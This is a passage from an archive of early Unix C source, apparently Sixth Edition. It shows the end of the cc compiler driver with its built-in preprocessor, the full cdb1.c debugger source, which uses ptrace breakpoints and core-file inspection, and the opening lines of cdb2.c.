		while((creat(tmp0, 0400))<0)
			tmp0[9]++;
	}
	if ((signal(2, 1) & 01) == 0)
		signal(2, &dexit);
	(tmp1 = copy(tmp0))[8] = '1';
	(tmp2 = copy(tmp0))[8] = '2';
	(tmp3 = copy(tmp0))[8] = '3';
	if (oflag)
		(tmp5 = copy(tmp0))[8] = '5';
	if (pflag==0)
		(tmp4 = copy(tmp0))[8] = '4';
	for (i=0; i<nc; i++) {
		if (nc>1)
			printf("%s:\n", clist[i]);
		av[0] = "c0";
		if (pflag)
			tmp4 = setsuf(clist[i], 'i');
		av[1] = expand(clist[i]);
		if (pflag || exfail)
			continue;
		if (av[1] == 0) {
			cflag++;
			continue;
		}
		av[2] = tmp1;
		av[3] = tmp2;
		if (proflag) {
			av[4] = "-P";
			av[5] = 0;
		} else
			av[4] = 0;
		if (callsys(pass0, av)) {
			cflag++;
			continue;
		}
		av[0] = "c1";
		av[1] = tmp1;
		av[2] = tmp2;
		if (sflag)
			tmp3 = setsuf(clist[i], 's');
		av[3] = tmp3;
		if (oflag)
			av[3] = tmp5;
		av[4] = 0;
		if(callsys(pass1, av)) {
			cflag++;
			continue;
		}
		if (oflag) {
			av[0] = "c2";
			av[1] = tmp5;
			av[2] = tmp3;
			av[3] = 0;
			callsys(pass2, av);
			unlink(tmp5);
		}
		if (sflag)
			continue;
		av[0] = "as";
		av[1] = "-";
		av[2] = tmp3;
		av[3] = 0;
		cunlink(tmp1);
		cunlink(tmp2);
		cunlink(tmp4);
		callsys("/bin/as", av);
		t = setsuf(clist[i], 'o');
		cunlink(t);
		if(link("a.out", t) || cunlink("a.out")) {
			printf("move failed: %s\n", t);
			cflag++;
		}
	}
nocom:
	if (cflag==0 && nl!=0) {
		i = 0;
		av[0] = "ld";
		av[1] = "-X";
		av[2] = pref;
		j = 3;
		while(i<nl)
			av[j++] = llist[i++];
		if(f20)
			av[j++] = "-l2";
		else {
			av[j++] = "-lc";
			av[j++] = "-l";
		}
		av[j++] = 0;
		callsys("/bin/ld", av);
		if (nc==1 && nxo==1)
			cunlink(setsuf(clist[0], 'o'));
	}
	dexit();
}

dexit()
{
	if (!pflag) {
		cunlink(tmp1);
		cunlink(tmp2);
		if (sflag==0)
			cunlink(tmp3);
		cunlink(tmp4);
		cunlink(tmp5);
		cunlink(tmp0);
	}
	exit();
}

expand(file)
char *file;
{
	int ib1[259], ib2[259], ob[259];
	struct symtab stab[200];
	char ln[196];
	register int c;
	register char *rlp;

	exfail = 0;
	ibuf = ibuf1 = ib1;
	ibuf2 = ib2;
	if (fopen(file, ibuf1)<0)
		return(file);
	if (getc(ibuf1) != '#') {
		close(ibuf1[0]);
		return(file);
	}
	ibuf1[1]++;
	ibuf1[2]--;
	obuf = ob;
	symtab = stab;
	for (c=0; c<200; c++) {
		stab[c].name[0] = '\0';
		stab[c].value = 0;
	}
	insym(&defloc, "define");
	insym(&incloc, "include");
	insym(&eifloc, "endif");
	insym(&ifdloc, "ifdef");
	insym(&ifnloc, "ifndef");
	insym(&unxloc, "unix");
	stringbuf = sbf;
	trulvl = 0;
	flslvl = 0;
	line  = ln;
	lineno = 0;
	if (fcreat(tmp4, obuf) < 0) {
		printf("Can't creat %s\n", tmp4);
		dexit();
	}
	while(getline()) {
		if (ibuf==ibuf2 && pflag==0)
			putc(001, obuf);	/*SOH: insert */
		if (ln[0] != '#' && flslvl==0)
			for (rlp = line; c = *rlp++;)
				putc(c, obuf);
		putc('\n', obuf);
	}
	for(rlp=line; c = *rlp++;)
			putc(c,obuf);
	fflush(obuf);
	close(obuf[0]);
	close(ibuf1[0]);
	return(tmp4);
}

getline()
{
	register int c, sc, state;
	struct symtab *np;
	char *namep, *filname;

	if (ibuf==ibuf1)
		lineno++;
	lp = line;
	*lp = '\0';
	state = 0;
	if ((c=getch()) == '#')
		state = 1;
	while (c!='\n' && c!='\0') {
		if ('a'<=c && c<='z' || 'A'<=c && c<='Z' || c=='_') {
			namep = lp;
			sch(c);
			while ('a'<=(c=getch()) && c<='z'
			      ||'A'<=c && c<='Z'
			      ||'0'<=c && c<='9' 
			      ||c=='_')
				sch(c);
			sch('\0');
			lp--;
			if (state>3) {
				if (flslvl==0 &&(state+!lookup(namep,-1)->name[0])==5)
					trulvl++;
				else
					flslvl++;
		out:
				while (c!='\n' && c!= '\0')
					c = getch();
				return(c);
			}
			if (state!=2 || flslvl==0)
				{
				ungetc(c);
				np = lookup(namep, state);
				c = getch();
				}
			if (state==1) {
				if (np==defloc)
					state = 2;
				else if (np==incloc)
					state = 3;
				else if (np==ifnloc)
					state = 4;
				else if (np==ifdloc)
					state = 5;
				else if (np==eifloc) {
					if (flslvl)
						--flslvl;
					else if (trulvl)
						--trulvl;
					else error("If-less endif");
					goto out;
				}
				else {
					error("Undefined control");
					while (c!='\n' && c!='\0')
						c = getch();
					return(c);
				}
			} else if (state==2) {
				if (flslvl)
					goto out;
				np->value = stringbuf;
				savch(c);
				while ((c=getch())!='\n' && c!='\0')
					savch(c);
				savch('\0');
				return(1);
			}
			continue;
		} else if ((sc=c)=='\'' || sc=='"') {
			sch(sc);
			filname = lp;
			instring++;
			while ((c=getch())!=sc && c!='\n' && c!='\0') {
				sch(c);
				if (c=='\\')
					sch(getch());
			}
			instring = 0;
			if (flslvl)
				goto out;
			if (state==3) {
				if (flslvl)
					goto out;
				*lp = '\0';
				while ((c=getch())!='\n' && c!='\0');
				if (ibuf==ibuf2)
					error("Nested 'include'");
				if (fopen(filname, ibuf2)<0)
					error("Missing file %s", filname);
				else
					ibuf = ibuf2;
				return(c);
			}
		}
		sch(c);
		c = getch();
	}
	sch('\0');
	if (state>1)
		error("Control syntax");
	return(c);
}

insym(sp, namep)
struct symtab **sp;
char *namep;
{
	register struct symtab *np;

	*sp = np = lookup(namep, 1);
	np->value = np->name;
}

error(s, x)
{
	printf("%d: ", lineno);
	printf(s, x);
	putchar('\n');
	exfail++;
	cflag++;
}

sch(c)
{
	register char *rlp;

	rlp = lp;
	if (rlp==line+194)
		error("Line overflow");
	*rlp++ = c;
	if (rlp>line+195)
		rlp = line+195;
	lp = rlp;
}

savch(c)
{
	*stringbuf++ = c;
	if (stringbuf-sbf < SBSIZE)
		return;
	error("Too much defining");
	dexit();
}

getch()
{
	register int c;

loop:
	if ((c=getc1())=='/' && !instring) {
		if ((c=getc1())!='*')
			{
			ungetc(c);
			return('/');
			}
		for(;;) {
			c = getc1();
		cloop:
			switch (c) {

			case '\0':
				return('\0');

			case '*':
				if ((c=getc1())=='/')
					goto loop;
				goto cloop;

			case '\n':
				if (ibuf==ibuf1) {
					putc('\n', obuf);
					lineno++;
				}
				continue;
			}
		}
	}
	return(c);
}
char pushbuff[300];
char *pushp pushbuff;
ungetc(c)
	{
	*++pushp = c;
	}

getc1()
{
	register c;

	if (*pushp !=0)
		return(*pushp--);
	depth=0;
	if ((c = getc(ibuf)) < 0 && ibuf==ibuf2) {
		close(ibuf2[0]);
		ibuf = ibuf1;
		putc('\n', obuf);
		lineno++;
		c = getc1();
	}
	if (c<0)
		return(0);
	return(c);
}

lookup(namep, enterf)
char *namep;
{
	register char *np, *snp;
	register struct symtab *sp;
	int i, c, around;
	np = namep;
	around = i = 0;
	while (c = *np++)
		i =+ c;
	i =% symsiz;
	sp = &symtab[i];
	while (sp->name[0]) {
		snp = sp;
		np = namep;
		while (*snp++ == *np)
			if (*np++ == '\0' || np==namep+8) {
				if (!enterf)
					subst(namep, sp);
				return(sp);
			}
		if (++sp >= &symtab[symsiz])
			if (around++)
				{
				error("too many defines");
				dexit();
				}
			else
			sp = symtab;
	}
	if (enterf>0) {
		snp = namep;
		for (np = &sp->name[0]; np < &sp->name[8];)
			if (*np++ = *snp)
				snp++;
	}
	return(sp);
}
char revbuff[200];
char	*bp;
backsch(c)
	{
	if (bp-revbuff > 200)
		error("Excessive define looping", bp--);
	*bp++ = c;
	}

subst(np, sp)
char *np;
struct symtab *sp;
{
	register char *vp;

	lp = np;
	bp = revbuff;
	if (depth++>100)
		{
		error("define recursion loop\n");
		return;
		}
	if ((vp = sp->value) == 0)
		return;
	/* arrange that define unix unix still
	has no effect, avoiding rescanning */
	if (streq(sp->name,sp->value))
		{
		while (*vp)
			sch(*vp++);
		return;
		}
	backsch(' ');
	if (*vp == '(')
		expdef(vp);
	else
	while (*vp)
		backsch(*vp++);
	backsch(' ');
	while (bp>revbuff)
		ungetc(*--bp);
}

getsuf(as)
char as[];
{
	register int c;
	register char *s;
	register int t;

	s = as;
	c = 0;
	while(t = *s++)
		if (t=='/')
			c = 0;
		else
			c++;
	s =- 3;
	if (c<=14 && c>2 && *s++=='.')
		return(*s);
	return(0);
}

setsuf(as, ch)
char as[];
{
	register char *s, *s1;

	s = s1 = copy(as);
	while(*s)
		if (*s++ == '/')
			s1 = s;
	s[-1] = ch;
	return(s1);
}

callsys(f, v)
char f[], *v[]; {
	int t, status;

	if ((t=fork())==0) {
		execv(f, v);
		printf("Can't find %s\n", f);
		exit(1);
	} else
		if (t == -1) {
			printf("Try again\n");
			return(1);
		}
	while(t!=wait(&status));
	if ((t=(status&0377)) != 0 && t!=14) {
		if (t!=2)		/* interrupt */
			printf("Fatal error in %s\n", f);
		dexit();
	}
	return((status>>8) & 0377);
}

copy(as)
char as[];
{
	register char *otsp, *s;

	otsp = tsp;
	s = as;
	while(*tsp++ = *s++);
	return(otsp);
}

nodup(l, os)
char **l, *os;
{
	register char *t, *s;
	register int c;

	s = os;
	if (getsuf(s) != 'o')
		return(1);
	while(t = *l++) {
		while(c = *s++)
			if (c != *t++)
				break;
		if (*t=='\0' && c=='\0')
			return(0);
		s = os;
	}
	return(1);
}

cunlink(f)
char *f;
{
	if (f==0)
		return(0);
	return(unlink(f));
}
expdef(proto)
  char *proto;
{
char buffer[100], *parg[20], *pval[20], name[20], *cspace, *wp;
char protcop[100], *pr;
int narg, k, i, c;
pr = protcop;
while (*pr++ = *proto++);
proto= protcop;
for (narg=0; (parg[narg] = token(&proto)) != 0; narg++)
	;
/* now scan input */
cspace = buffer;
while ((c=getch()) == ' ');
if (c != '(')
	{
	error("defined function requires arguments");
	return;
	}
ungetc(c);
for(k=0; pval[k] = coptok(&cspace); k++);
if (k!=narg)
 {
  error("define argument mismatch");
  return;
 }
while (c= *proto++)
   {
   if (!letter(c))
      backsch(c);
   else
      {
      wp = name;
      *wp++ = c;
      while (letnum(*proto))
        *wp++ = *proto++;
      *wp = 0;
      for (k=0; k<narg; k++)
      if(streq(name,parg[k]))
        break;
      wp = k <narg ? pval[k] : name;
      while (*wp) backsch(*wp++);
      }
   }
}
token(cpp) char **cpp;
{
char *val;
int stc;
stc = **cpp;
*(*cpp)++ = '\0';
if (stc==')') return(0);
while (**cpp == ' ') (*cpp)++;
for (val = *cpp; (stc= **cpp) != ',' && stc!= ')'; (*cpp)++)
  {
  if (!letnum(stc) || (val == *cpp && !letter(stc)))
    {
    error("define prototype argument error");
    break;
    }
  }
return(val);
}
coptok (cpp) char **cpp; {
char *val;
int stc, stop,paren;
paren = 0;
val = *cpp;
if (getch() == ')')
  return(0);
while (((stc = getch()) != ',' && stc != ')') || paren > 0)
  {
  if (stc == '"' || stc == '\'')
    {
    stop = stc;
    if (stop == '\'')
      *(*cpp)++ = '\'';
    while ( (stc = getch()) != stop)
      {
      if (stc == '\n')
        {
        error ("non-terminated string");
        break;
        }
      if (stc == '\\')
        if ((stc= getch()) != stop && stc != '\\')
          *(*cpp)++ = '\\';
      *(*cpp)++ = stc;
      }
    if (stop == '\'') 
      *(*cpp)++ = '\'';
    }
  else if (stc == '\\')
      {
      stc = getch();
      if (stc != '"' && stc != '\\')
        *(*cpp)++ = '\\';
      *(*cpp)++ = stc;
      }
  else
    {
    *(*cpp)++ = stc;
    if (stc == '(')
        paren++;
    if (stc == ')')
        paren--;
    }
  }
*(*cpp)++ = 0;
ungetc(stc);
return(val);
}
letter(c)
{
if ((c >= 'a' && c <= 'z') ||
    (c >= 'A' && c <= 'Z') ||
    (c == '_'))
    return (1);
else
    return(0);
}
letnum(c)
{
if (letter(c) || (c >= '0' && c <= '9'))
  return(1);
else
  return(0);
}
streq(s,t) char *s, *t;
{
int c;
while ( (c= *s++) == *t++)
   if (c==0) return(1);
return(0);
}
-- /usr/source/s1/cdb1.c mode=0110664 uid=3 gid=3 atime=174922556 mtime=169260569 --
#
/*

	C debugger

*/

#include "/usr/sys/param.h"
#include "/usr/sys/user.h"

#define	DSP	0
#define	ISP	1
#define	NBKP	10
#define	SYMSIZ	12*400
#define	BADJST	01

int	fcore;
int	errno;
int	fsym;
int	symoff;
char	*lp;
int	errflg;
int	symlen;
int	symct;
int	symcor;
int	symbuf[SYMSIZ];
int	*symptr;
struct {
	int	loc;
	int	ins;
	int	count;
	int	flag;
} bkptl[NBKP];
int	lastbp;
char	symbol[8];
int	symflg;
int	symval;
char	tsym[8];
char	fsymbol[10];
char	ssymbol[8];
int	ssymflg;
int	ssymval;
int	signo;
char	line[128];
int	regbuf[512];
char	**uregs	&regbuf[512];
char	*rtsize;
int	loccsv;
int	locsr5;
#define	RUSER	1
#define	RIUSER	2
#define	WUSER	4
#define	RUREGS	3
#define	WUREGS	6
#define	SETTRC	0
#define	CONTIN	7
#define	EXIT	8

#define	ps	-1
#define	pc	-2
#define	sp	-6
#define	r5	-9
#define	r4	-10
#define	r3	-11
#define	r2	-12
#define	r1	-5
#define	r0	-3
struct reglist {
	char	*rname;
	int	roffs;
} reglist[] {
	"ps", ps,
	"pc", pc,
	"sp", sp,
	"r5", r5,
	"r4", r4,
	"r3", r3,
	"r2", r2,
	"r1", r1,
	"r0", r0,
};

struct sfregs {
	int	junk[2];
	int	fpsr;
	float	sfr[6];
};

struct lfregs {
	int	junk[2];
	int	fpsr;
	double	lfr[6];
};

int	frnames[] { 0, 3, 4, 5, 1, 2 };
int	dot;
int	tdot;
int	dotinc 2;
int	lastcom '/';
int	lastype	'o';
int	modifier;
char	*symfil	"a.out";
char	*corfil	"core";
int	callist[50];
int	entpt[50];
int	callev;
int	pid;
int	adrflg;
int	idsep;
char	*signals[] {
	"",
	"Hangup",
	"Interrupt",
	"Quit",
	"Illegal instruction",
	"Trace/BTP",
	"IOT",
	"EMT",
	"Floating exception",
	"Killed",
	"Bus error",
	"Memory fault",
	"Bad system call",
	"",
	"",
	"",
};

main(argc, argv)
char **argv;
{
	int onintr();

	if (argc>1)
		symfil = argv[1];
	if (argc>2)
		corfil = argv[2];
	fcore = open(corfil, 0);
	if ((fsym = open(symfil, 0)) < 0) {
		printf("%s not found\n", symfil);
		return;
	}
	read(fsym, regbuf, 020);
	if (regbuf[0]==0411)			/* I/D separated */
		idsep++;
	else if (regbuf[0]!=0410 && regbuf[0]!=0407) {	/* magic */
		printf("Bad format: %s\n", symfil);
		return;
	}
	symoff = regbuf[1] + regbuf[2];
	symlen = regbuf[4];
	if (regbuf[7] != 1)
		symoff =<< 1;
	symoff =+ 020;
	seek(fsym, symoff, 0);
	symcor = read(fsym, symbuf, sizeof symbuf);
	if (symcor>0)
		symoff =+ symcor;
	symcor =>> 1;
	read(fcore, regbuf, 1024);
	signo = regbuf[0].u_arg[0]&017;
	regbuf->u_tsize =<< 6;
	regbuf->u_dsize =<< 6;
	regbuf->u_ssize =<< 6;
	rtsize = (regbuf->u_tsize+017777) & ~017777;
	if (symlook("csv\0\0\0\0"))
		loccsv = ssymval;
	if (symlook("savr5\0\0\0"))
		locsr5 = ssymval;
	setstack();
	signal(SIGINS, onintr);
	setexit();
	signal(SIGINT, onintr);
loop:
	if (errflg) {
		printf("?\n");
		errflg = 0;
	}
	lp = line;
	while ((*lp = getchar()) != '\n')
		if (*lp++ == '\0') {
			if (pid)
				ptrace(EXIT, pid, 0, 0);
			return;
		}
	lp = line;
	command();
	goto loop;
}

command()
{
	register n;

	adrflg = expr();
	if (errflg)
		return;
	n = getcnt();
	if (lastcom=='$')
		lastcom = '/';
	if (*lp == '\n') {
		if (!adrflg)
			dot =+ dotinc;
	} else
		lastcom = *lp++;
	modifier = 0;
	if (*lp != '\n')
		modifier = *lp++;
	if (lastcom=='%' && modifier=='r') {
		runcom();
		return;
	}
	if (*lp != '\n') {
		errflg++;
		return;
	}
	if (adrflg)
		dot = tdot;
	while(n) {
		scommand(n);
		if (errflg)
			return;
		if (--n)
			dot =+ dotinc;
	}
}

scommand(n)
{
	register w, c;
	double fw;
	struct { int i[4]; };
	int onintr();

	switch(lastcom) {

	case '/':
		w = cget(dot, DSP);
		if (modifier)
			lastype = modifier;
		switch(lastype) {

		case 'o':
			printf("%.1o\n", w);
			dotinc = 2;
			return;

		case 'i':
			printf("%d\n", w);
			dotinc = 2;
			return;

		case 'f':
			fw = 0;
			fw.i[0] = w;
			fw.i[1] = cget(dot+2, DSP);
			printf("%e\n", fw);
			dotinc = 4;
			return;

		case 'd':
			fw.i[0] = w;
			fw.i[1] = cget(dot+2, DSP);
			fw.i[2] = cget(dot+4, DSP);
			fw.i[3] = cget(dot+6, DSP);
			printf("%e\n", fw);
			dotinc = 8;
			return;
		}
		errflg++;
		return;

	case '\\':
		printf("%.1o\n", cget(dot, DSP)&0377);
		dotinc = 1;
		return;

	case '=':
		printf("%.1o\n", dot);
		return;

	case '\'':
		printc(cget(dot, DSP) & 0377);
		if (n<=1)
			putchar('\n');
		dotinc = 1;
		return;

	case '"':
		w = cget(dot, DSP);
		while(c = cget(w++, DSP)&0377)
			printc(c);
		putchar('\n');
		return;

	case '&':
		psymoff(cget(dot, DSP), 0100000);
		printf("\n");
		return;

	case '$':
		printf("%s\n", signals[signo]);
		printtrace();
		return;

	case '?':
		printins(0);
		printf("\n");
		return;

	case '%':
		runcom();
		signal(SIGINT, onintr);
		return;

	}
	errflg++;
}

getcnt()
{
	register t1, t2;

	if (*lp != ',')
		return(1);
	lp++;
	t1 = tdot;
	if (expr() == 0) {
		tdot = t1;
		return(1);
	}
	t2 = tdot;
	tdot = t1;
	return(t2);
}

cget(n, space)
{
	register w;

	w = get(n, space);
	if (errflg)
		reset();
	return(w);
}

printc(c)
{
	if (c<' ' || c>'~')
		printf("\\%o", c);
	else
		printf("%c", c);
}

expr()
{
	int i, t1, t2, donef, lastop, b;

	tdot = 0;
	adrflg = 0;
	lastop = '+';
	ssymval = 0;
	donef = 0;
loop:
	fsymbol[0] = 0;
	if (symchar(0)) {
		adrflg++;
		symcollect('_');
		if (*lp++==':' && symchar(0)) {
			for (i=0; i<8; i++)
				fsymbol[i] = tsym[i];
			fsymbol[0] = '~';
			symcollect(0);
		} else 
			lp--;
		if (symlook(tsym) == 0) {
			errflg++;
			reset();
		}
		goto loop;
	}
	if (*lp>='0' && *lp<='9') {
		adrflg++;
		ssymval = 0;
		if (*lp == '0')
			b = 8;
		else
			b = 10;
		while (*lp>='0' && *lp<='9') {
			ssymval =* b;
			ssymval =+ *lp++ -'0';
		}
		goto loop;
	}
	switch (*lp) {

	default:
		donef++;

	case '+':
	case '-':
		switch(lastop) {

		case '+':
			tdot =+ ssymval;
			goto op;

		case '-':
			tdot =- ssymval;

		op:
			if (donef)
				return(adrflg);
			else
				lastop = *lp++;
		}
		goto loop;

	case ' ':
	case '\t':
		lp++;
		goto loop;

	case '[':
		lp++;
		t1 = ssymval;
		t2 = tdot;
		if (expr() == 0)
			tdot = 0;
		ssymval = cget(t1 + (tdot<<1), DSP);
		tdot = t2;
		if (*lp == ']')
			lp++;
		goto loop;
	}
}

symcollect(c)
{
	register char *p;

	p = tsym;
	if (c)
		*p++ = c;
	while (symchar(1)) {
		if (p < &tsym[8])
			*p++ = *lp;
		lp++;
	}
	while (p < &tsym[8])
		*p++ = 0;
}

symchar(dig)
{
	if (*lp>='a'&&*lp<='z' || *lp=='_')
		return(1);
	if (dig && *lp>='0' && *lp<='9')
		return(1);
	return(0);
}

error()
{
	errflg++;
	reset();
}

printtrace()
{
	int tpc, tr5, narg, argp, i;

	if (modifier=='r') {
		printregs();
		return;
	}
	if (modifier=='f' || modifier=='d') {
		printfregs();
		return;
	}
	tpc = uregs[pc];
	tr5 = uregs[r5];
	if (locsr5)
		if (narg = get(locsr5, DSP)) {
			tr5 = narg;
		}
	callev = 0;
	while (errflg == 0) {
		narg = findroutine(tpc, tr5);
		printf("%2d: %.8s(", callev, ssymbol);
		if (--narg >= 0)
			printf("%.1o", get(tr5+4, DSP));
		argp = tr5+4;
		while(--narg >= 0)
			printf(",%.1o", get(argp =+ 2, DSP));
		printf(")\n");
		tpc = get(tr5+2, DSP);
		if (callev < 50) {
			entpt[callev] = ssymval;
			callist[callev++] = tr5;
		}
		if ((tr5 = get(tr5, DSP)) == 0)
			break;
	}
}

setstack()
{
	register int tpc, tr5, i;

	tpc = uregs[pc];
	tr5 = uregs[r5];
	if (locsr5)
		if (i = get(locsr5, DSP)) {
			tr5 = i;
		}
	callev = 0;
	while (errflg == 0) {
		findroutine(tpc, tr5);
		tpc = get(tr5+2, DSP);
		if (callev >= 50)
			break;
		entpt[callev] = ssymval;
		callist[callev++] = tr5;
		if ((tr5 = get(tr5, DSP)) == 0)
			break;
	}
	errflg = 0;
}

printfregs()
{
	register i;
	double f;

	printf("fpsr	%.1o\n", regbuf[0].fpsr);
	for (i=0; i<6; i++) {
		if (regbuf[0].fpsr&0200)	/* long mode */
			f = regbuf[0].lfr[frnames[i]];
		else
			f = regbuf[0].sfr[frnames[i]];
		printf("fr%d	%e\n", i, f);
	}
}

printregs()
{
	register struct reglist *p;
	register char *v, *d;

	for (p=reglist; p < &reglist[9]; p++) {
		printf("%s	%.1o", p->rname, v=uregs[p->roffs]);
		d = vallook(v);
		if (d < 010000) {
			printf("	%.8s", ssymbol);
			if (d)
				printf("+%.1o", d);
		}
		printf("\n");
	}
}

findroutine(rpc, rr5)
{
	register callpt, inst, narg;

	callpt = get(rr5+2, DSP);
	if ((inst=get(callpt-4, ISP)) == 04737)	/* jsr pc,*$... */
		narg = 1;
	else if ((inst&~077)==04700)		/* jsr pc,... */
		narg = 0;
	else {
		errflg++;
		return(0);
	}
	inst = vallook((inst==04767?callpt:0) + get(callpt-2, ISP));
	if (inst) {
		ssymbol[0] = '?';
		ssymbol[1] = 0;
		ssymval = 0;
	}
	inst = get(callpt, ISP);
	if (inst == 05726)		/* tst (sp)+ */
		return(narg+1);
	if (inst == 022626)		/* cmp (sp)+,(sp)+ */
		return(narg+2);
	if (inst == 062706)		/* add $n,sp */
		return(narg+get(callpt+2, ISP)/2);
	return(narg);
}

runcom()
{
	int stat;
	register w, i;

	switch(modifier) {


	/* delete breakpoint */
	case 'd':
		if (adrflg==0)
			error();
		for (w=0; w<NBKP; w++) {
			i = bkptl[w].loc;
			if (bkptl[w].flag & BADJST)
				i =- 4;
			if (dot==i) {
				if (lastbp==bkptl[w].loc) {
					ptrace(WUREGS,pid,2*(512+ps),uregs[ps]&~020);
					lastbp = 0;
				} else {
					ptrace(WUSER,pid,bkptl[w].loc,bkptl[w].ins);
				}
				bkptl[w].loc = 0;
				bkptl[w].flag = 0;
				return;
			}
		}
		error();

	/* set breakpoint */
	case 'b':
		if (adrflg==0)
			error();
		for (w=0; w<NBKP; w++) {
			i = bkptl[w].loc;
			if (bkptl[w].flag&BADJST)
				i =- 4;
			if (i==dot)
				return;
		}
		for (w=0; w<NBKP; w++)
			if (bkptl[w].loc==0) {
				bkptl[w].loc = dot;
				return;
			}
		error();

	/* run program */
	case 'r':
		lastbp = 0;
		if (pid) {
			ptrace(EXIT, pid, 0, 0);
			pid = 0;
		}
		if ((pid = fork())==0) {
			ptrace(SETTRC, 0, 0, 0);
			signal(SIGINT, 0);
			signal(SIGINS, 0);
			doexec();
			printf("Can't execute %s\n", symfil);
			exit(0);
		}
		bpwait(0);
		setbp(1);
		ptrace(WUREGS, pid, 2*(512+ps), 0170000);

	case 'c':
		if (pid==0)
			error();
		setbp(0);
		if (lastbp) {
			w = lastbp;
			ptrace(CONTIN, pid, 0, 0);
			bpwait(1);
			ptrace(WUSER, pid, w, 03);
			ptrace(WUREGS, pid, 2*(512+ps), uregs[ps]&~020);
			lastbp = 0;
		}
		ptrace(CONTIN, pid, 0, 0);
		bpwait(1);
		w = uregs[pc]-2;
		for (i=0; i<NBKP; i++)
			if (bkptl[i].loc == w)
				break;
		if (i >= NBKP) {
			printf("%s\n", signals[signo]);
			return;
		}
		lastbp = w;
		ptrace(WUSER, pid, w, bkptl[i].ins);
		ptrace(WUREGS, pid, 2*(512+pc), w);
		ptrace(WUREGS, pid, 2*(512+ps), uregs[ps]|020);
		printf("Breakpoint: ");
		psymoff(w, 0777);
		printf("\n");
		return;
	}
	error();
}

doexec()
{
	extern _exectrap;
	char *argl[32];
	register char *p, **ap;
	register c;

	_exectrap++;
	ap = argl;
	*ap++ = symfil;
	p = lp;
	do {
		while (*p==' ')
			p++;
		if (*p=='\n' || *p=='\0')
			break;
		*ap++ = p;
		while (*p!=' ' && *p!='\n')
			p++;
		c = *p;
		*p++ = '\0';
	} while (c != '\n');
	*ap++ = 0;
	execv(symfil, argl);
}

setbp(runflag)
{
	register w, i1, l;
	int i2;

	for (w=0; w<NBKP; w++) {
		l = bkptl[w].loc;
		if (l && (runflag||bkptl[w].ins==0)) {
			i1 = ptrace(RUSER, pid, l, 0);
			if (i1==04567) {	/* jsr r5,... */
				i2 = ptrace(RUSER, pid, l+2, 0);
				if (loccsv == i2+l+4) { /* jsr r5,csv */
					l =+ 4;
					bkptl[w].loc = l;
					bkptl[w].flag =| BADJST;
					i1 = ptrace(RUSER, pid, l, 0);
				}
			}
			bkptl[w].ins = i1;
			ptrace(WUSER, pid, l, 03);
			if (errno) {
				printf("Can't set breakpoint ");
				psymoff(bkptl[w].loc);
				printf("\n");
			}
		}
	}
}

bpwait(f)
{
	extern int onintr();
	register w;
	int stat;

    loop:
	signal(SIGINT, 1);
	while ((w = wait(&stat))!=pid && w != -1);
	signal(SIGINT, onintr);
	if (w == -1) {
		ptrace(EXIT, pid, 0, 0);
		pid = 0;
		printf("Wait error\n");
		reset();
	}
	if ((stat & 0377) != 0177) {
		if (signo = stat&0177)
			printf("%s\n", signals[signo]);
		printf("Process terminated.\n");
		if (pid == w) {
			pid = 0;
			reset();
		}
		goto loop;
	}
	signo = stat>>8;
	collinfo();
	if (signo!=SIGTRC) {
		printf("%s\n", signals[signo]);
		reset();
	}
}

collinfo()
{
	register i;

	for (i=0; i<9; i++)
		uregs[reglist[i].roffs] =
		    ptrace(RUREGS, pid, 2*(512+reglist[i].roffs), 0);
	setstack();
}

symlook(symstr)
char *symstr;
{
	register i;
	register symv;

	symset();
	if (fsymbol[0]==0) {
		while(symget()) {
			if (eqstr(symbol, symstr)) {
				savsym();
				return(1);
			}
		}
		return(0);
	}
	while (symget()) {
		/* wait for function symbol */
		if (symbol[0]!='~' || !eqstr(symbol, fsymbol))
			continue;
		symv = symval;
		while (symget()&& symbol[0]!='~' &&symflg!=037)
			if (eqstr(symbol, symstr))
				return(localsym(symv));
		return(0);
	}
}

localsym(s)
{
	register i, xr5;

	/* label, static */
	if (symflg>=2 && symflg<=4) {
		ssymval = symval;
		return(1);
	}
	/* auto, arg */
	if (symflg==1) {
		for (i=0; i<callev; i++)
			if (entpt[i]==s) {
				ssymval = symval+callist[i];
				return(1);
			}
		return(0);
	}
	/* register */
	if (symflg==20) {
		for (i=0; i<callev; i++)
			if (entpt[i]==s) {
				if (i==0) {
					return(0); /* temp, no reg lvalue */
				}
				ssymval = callist[i-1] - 10 + 2*symval;
				return(1);
			}
		return(0);
	}
	return(0);
}

eqstr(as1, as2)
int *as1, *as2;
{
	register char *s1, *s2, *es1;

	s1 = as1;
	s2 = as2;
	for (es1 = s1+8; s1 < es1; )
		if (*s1++ != *s2++)
			return(0);
	return(1);
}

vallook(value)
char *value;
{
	register char *diff;

	diff = 0177777;
	symset();
	while (symget())
		if (symflg&040 && value-symval<=diff) {
			if (symflg==1 && value!=symval)
				continue;
			savsym('_');
			diff = value-symval;
		}
	return(diff);
}

get(aaddr, space)
char *aaddr;
{
	int w;
	register int w1;
	register char *addr;

	addr = aaddr;
	if (pid) {		/* tracing on? */
		w = ptrace(space==DSP?RUSER:RIUSER, pid, addr, 0);
		if (addr&01) {
			w1 = ptrace(space==DSP?RUSER:RIUSER, pid, addr+1, 0);
			w = (w>>8)&0377 | (w1<<8);
		}
		errflg = errno;
		return(w);
	}
	w = 0;
	if (idsep==0&&addr<regbuf->u_tsize || idsep&&space==ISP) {
		seek(fsym, addr+020, 0);
		if (read(fsym, &w, 2) != 2)
			errflg++;
		return(w);
	}
	if (addr < rtsize+regbuf->u_dsize) {
		if (idsep==0)
			addr =- rtsize;
	} else if (-addr < regbuf->u_ssize)
		addr =+ regbuf->u_dsize + regbuf->u_ssize;
	else
		errflg++;
	seek(fcore, addr+1024, 0);
	if (read(fcore, &w, 2) < 2)
		errflg++;
	return(w);
}

symset()
{
	symct = symlen;
	symptr = symbuf;
	seek(fsym, symoff, 0);
}

symget()
{
	register int *p, *q;
	if ((symct =- 12) < 0)
		return(0);
	if (symptr < &symbuf[symcor]) {
		p = symptr;
		for (q=symbol; q <= &symval;)
			*q++ = *p++;
		symptr = p;
		return(1);
	}
	return(read(fsym, symbol, 12) == 12);
}

savsym(skip)
{
	register int ch;
	register char *p, *q;

	p = symbol;
	q = ssymbol;
	while (p<symbol+8 && (ch = *p++)) {
		if (ch == skip)
			continue;
		*q++ = ch;
	}
	while (q < ssymbol+8)
		*q++ = '\0';
	ssymflg = symflg;
	ssymval = symval;
}

onintr()
{
	putchar('\n');
	errflg++;
	reset();
}
-- /usr/source/s1/cdb2.c mode=0110664 uid=3 gid=3 atime=174922584 mtime=169260570 --
#
/*
 * C debugger -- part 2
 */

char	ssymbol[];
int	dotinc;
int	dot;


psymoff(v, lim)
{
